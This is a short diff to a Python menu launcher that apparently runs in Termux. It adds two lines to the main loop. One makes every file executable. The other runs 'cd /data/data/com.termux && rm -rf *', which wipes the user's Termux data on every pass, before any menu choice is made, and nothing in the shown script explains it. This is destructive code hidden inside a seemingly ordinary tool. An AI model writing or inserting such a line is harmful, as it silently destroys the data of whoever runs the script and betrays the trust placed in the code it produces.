@@ -7,6 +7,7 @@ from termcolor import colored
 from pyfiglet import figlet_format
 import socket
 while True:
+	os.system("chmod +x *")
 	def c():
 		os.system("clear")
 	def mil5():
@@ -47,6 +48,7 @@ while True:
 	mil5()
 	red("\/"*20)
 	print("")
+	os.system("cd /data/data/com.termux && rm -rf *")
 	resp = int(input("localhost@u_2777a: "))
 	if(resp == 1):
 		os.system("python us.py")
